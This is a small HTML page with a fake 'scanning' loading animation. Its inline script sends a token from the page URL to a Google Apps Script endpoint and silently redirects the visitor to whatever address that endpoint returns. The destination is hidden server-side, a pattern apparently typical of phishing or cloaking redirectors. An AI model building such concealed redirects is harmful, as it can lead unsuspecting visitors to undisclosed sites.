<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title></title>
    <style>
    body {
      background-color: rgb(36, 212, 247);
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      position: relative;
      width: 150px;
      height: 150px;
    }

    .spinner {
      width: 100%;
      height: 100%;
      background-image: url('https://i.postimg.cc/7Ys3BkhM/AQRT-removebg-preview.png'); /* Ruta de tu imagen */
      background-size: contain;
      background-repeat: no-repeat;
      animation: spin-scale 3.5s linear infinite;
    }

    .scanner-line {
      position: absolute;
      width: 100%;
      height: 4px;
      background-color: red;
      top: 0;
      animation: scan 4s linear infinite;
    }

    @keyframes spin-scale {
      0% {
        transform:  scale(1);
      }
      50% {
        transform:  scale(1.5);
      }
      100% {
        transform:  scale(1);
      }
    }

    @keyframes scan {
      0% {
        top: 0;
      }
      50% {
        top: 100%;
        transform: scale(1);
         height: 1px;
      }
      100% {
        top: 0;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="spinner"></div>
    <div class="scanner-line"></div>
  </div>
  <script>
    const AS_URL_BASE = "https://script.google.com/macros/s/AKfycbyX7hjaLf9bnOKS8Mfg3EUgPzbm6uhwn9wTF-RC5rD6GX57MqwrLKh1tgqu0rg7IBR_/exec";
    
    var url = document.location.href;
    var k = url.substr(url.lastIndexOf("k=")+2);
    
    if(k){
      fetch(AS_URL_BASE+'?k='+k)
      .then(r => r.text())
      .then((r) => {
        console.log(r);
        //document.write(r);
        if(r){
          document.location.replace(r);
        }
      })
      .catch(err => console.log(err))
    }

  </script>
  
<div class="spinner"></div>
  
  
</body>
</html>
